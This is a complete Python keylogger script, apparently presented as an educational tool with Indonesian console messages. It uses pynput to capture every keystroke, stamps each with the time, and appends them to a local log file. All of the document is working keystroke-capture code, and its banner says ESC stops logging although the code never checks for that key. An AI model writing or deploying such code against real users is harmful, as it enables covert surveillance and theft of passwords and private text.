from pynput import keyboard
import datetime



class SimpleKeylogger:
    def __init__(self, filename="keylog.txt"):
        self.filename = filename
        self.start_time = datetime.datetime.now()
        
    def write_to_file(self, message):
        with open(self.filename, "a", encoding="utf-8") as f:
            f.write(message)
    
    def on_press(self, key):
        try:

            current_time = datetime.datetime.now().strftime("%H:%M:%S")
            
            char = key.char
            log_entry = f"[{current_time}] {char}\n"
            
        except AttributeError:
            current_time = datetime.datetime.now().strftime("%H:%M:%S")
            special_keys = {
                keyboard.Key.space: "[SPACE]",
                keyboard.Key.enter: "[ENTER]\n",
                keyboard.Key.tab: "[TAB]",
                keyboard.Key.backspace: "[BACKSPACE]",
                keyboard.Key.shift: "[SHIFT]",
                keyboard.Key.ctrl_l: "[CTRL]",
                keyboard.Key.alt_l: "[ALT]"
            }
            
            log_entry = f"[{current_time}] {special_keys.get(key, str(key))}\n"
            
        except:
            return
        

        self.write_to_file(log_entry)
        print(log_entry.strip())  
        
        return True
    
    def start(self):
        print("=" * 50)
        print("Keylogger Edukasi Dimulai")
        print(f"Waktu mulai: {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"File log: {self.filename}")
        print("Tekan ESC untuk menghentikan")
        print("=" * 50)
        

        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    logger = SimpleKeylogger()
    
    try:
        logger.start()
    except KeyboardInterrupt:
        print("\n\nKeylogger dihentikan oleh user")
        end_time = datetime.datetime.now()
        duration = end_time - logger.start_time
        print(f"Durasi logging: {duration}")